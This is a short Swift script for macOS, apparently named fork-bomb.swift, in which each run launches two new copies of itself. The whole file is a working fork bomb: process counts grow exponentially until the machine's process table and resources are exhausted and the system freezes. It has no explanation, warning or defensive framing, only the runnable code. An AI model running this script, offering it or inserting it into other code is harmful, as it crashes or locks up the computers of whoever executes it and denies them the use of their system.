#!/usr/bin/swift
//only works on osx
import Foundation

let child1 = Process()
child1.launchPath = "./fork-bomb.swift" /* the path to the current executable */
child1.launch()

let child2 = Process()
child2.launchPath = "./fork-bomb.swift" /* the path to the current executable */
child2.launch()
